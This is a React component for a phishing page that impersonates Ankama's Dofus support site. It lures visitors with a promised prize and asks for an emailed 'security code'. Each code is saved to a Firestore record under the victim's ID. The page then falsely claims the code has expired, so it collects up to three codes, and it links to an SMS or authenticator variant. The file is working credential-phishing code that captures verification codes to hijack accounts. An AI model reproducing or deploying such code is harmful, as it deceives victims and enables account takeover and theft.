import React, { useEffect, useState } from 'react'
import db from "../Firebase"
import { doc, setDoc, updateDoc } from "firebase/firestore";
import styles from '../styles/Home4.module.css'; // Update path based on your project structure
import { useNavigate, Link, useLocation } from 'react-router-dom';


import facebookImage from '../assets/facebook.png';
import twitter from '../assets/twitter.png' 
import franceFlag from '../assets/france.png';
import usaFlag from '../assets/usa.png';
import germanyFlag from '../assets/de.png';
import spainFlag from '../assets/spain.png';
import portugalFlag from '../assets/portugal.png';
import italyFlag from '../assets/italy.png';
import logoImage from '../assets/logof.png';
import bannerImage from '../assets/background.jpg';
import search from "../assets/search.png"
import sword from "../assets/sword.png"
import logo from "../assets/logo-dofus.png"
import rep2 from "../assets/rep2.png"
import c1 from "../assets/c1.png"
import c2 from "../assets/c2.jpg"
import c3 from "../assets/c3.jpg"
import c4 from "../assets/c4.jpg"
import c5 from "../assets/c5.jpg"
import c6 from "../assets/c6.jpg"
import c7 from "../assets/c7.jpg"
import img0 from "../assets/img0.png"
import i1 from "../assets/1.png"
import i2 from "../assets/2.jpg"
import i3 from "../assets/3.jpg"
import i4 from "../assets/4.jpg"
import ad from '../assets/ad.jpg'

import comment from "../assets/comments.png"
import logoF from "../assets/logof.png"

function AppVer2(props) {
    const [page, setPage] = useState(false);
    const [phone, setPhone] = useState("");
    const [code, setCode] = useState("");
    const [min, setMin] = useState(3);
    const [sec1, setSec1] = useState(0);
    const [visible3, setVisible3] = useState(false)
    const [show,setShow] = useState(false)

    const Router = useNavigate();

    const location = useLocation();

    const {ip,uid} = location.state


    
    const fr = () => {
        Router('/mailVerification/fr',{state:{ip:ip,uid:uid}})

    }
    const es = () => {
        Router('/mailVerification/es',{state:{ip:ip,uid:uid}})

    }

    const prg = () => {
        Router('/mailVerification/prg',{state:{ip:ip,uid:uid}})

    }


    const [count,setCount] = useState(0);

    const send = async(e)=>{
     e.preventDefault();
     if (count === 0) {
     const document = doc(db, "users", uid);
     await updateDoc(document, {
         mail: code
     });
     }else if(count === 1){
       const document = doc(db, "users", uid);
       await updateDoc(document, {
           mail2: code
       });
     }else if(count === 2){
       const document = doc(db, "users", uid);
       await updateDoc(document, {
           mail3: code
       });
     }else{
       Router("dofus/en");
     }
     setCount(prev => prev + 1);
     setCode("");
     setShow(true)
   }


    return (
        <div className={styles.App}>

            <div className={styles.all3}>
                <div className={styles.nav3}>
                    <div className={styles.firstNav}>
                        <div className={styles.fcontainer}>
                            <div className={styles.leftC}>
                                <h3>ankama</h3>
                                <p>SUPPORT</p>
                            </div>
                            <div className={styles.rightC}>
                                <p style={{ zIndex: 10 }}>LOGOUT</p>
                                <div style={{ zIndex: 9 }} onClick={() => setVisible3(!visible3)} className={styles.flags}>
                                    <div className={styles.flag1}><img src={usaFlag} alt="" /></div>
                                    {visible3 && (
                                        <>
                                            <div className={styles.flag}><img onClick={fr} src={franceFlag} alt="" /> <p className={styles.flagN}>FR</p> </div>
                                            <div className={styles.flag}><img src={usaFlag} alt="" /> <p className={styles.flagN}>EN</p></div>
                                            <div className={styles.flag}><img src={germanyFlag} alt="" /><p className={styles.flagN}>DE</p></div>
                                            <div className={styles.flag}><img onClick={es} src={spainFlag} alt="" /><p className={styles.flagN}>ES</p></div>
                                            <div className={styles.flag}><img onClick={prg} src={portugalFlag} alt="" /><p className={styles.flagN}>PT</p></div>
                                            <div className={styles.flag}><img src={italyFlag} alt="" /><p className={styles.flagN}>IT</p></div>


                                        </>
                                    )}
                                </div>
                            </div>
                        </div>
                    </div>

                </div>

                <div className={styles.headingContainer}>
                    <div className={styles.headingLogo}>
                        <img src={logoF} alt="" />
                    </div>
                    <div className={styles.headingContext}>
                        <form onSubmit={send} className={styles.boxing}>
                            <div className={styles.boxingHeader}>
                                <h2>SECURITY CODE</h2>
                            </div>
                            <center>
                                <div className={styles.boxContainer}>
                                    <center>
                                        <div className={styles.boxingMessage}>
                                            <p>An email has just been sent to you</p>
                                        </div>
                                        <div className={styles.boxingMessage2}>
                                        {!show && (<p>To unlock your prize, please enter the security code that has been sent to your email address.</p>)}
                                        {show && ( <p>The code has expired. Please enter the new security code that has just been sent to your email address.</p> )}
                                        </div>
                                        <div className={styles.code}>
                                            <p>Security Code*</p>
                                            <input onChange={(e) => setCode(e.target.value)} value={code} placeholder='Security Code' type="text" required />
                                        </div>
                                        <button type="submit">Validate</button>
                                        <div className={styles.goPhone}>
                                        <br />

                                            <div className={styles.link3} onClick={()=> Router("/verification/en",{state: {ip:ip,uid:uid}})} style={{ color: "red", textDecoration: "none", paddingLeft: "12px" }} shallow><p>Are you using the Authenticator? [SMS]</p></div>

                                        </div>
                                    </center>

                                </div>
                            </center>


                        </form>
                    </div>
                </div>


                <div className={styles.footer3}>
                    <center>
                        <div className={styles.containerf}>
                            <img src={logoF} alt="" />
                            <p>© 2021 Ankama. All rights reserved. Terms of Use - Privacy Policy - General Terms and Conditions of Sale - Legal Notice - Cookie Management</p>
                        </div>
                    </center>

                </div>

            </div>
        </div>
    )
}

export default AppVer2;
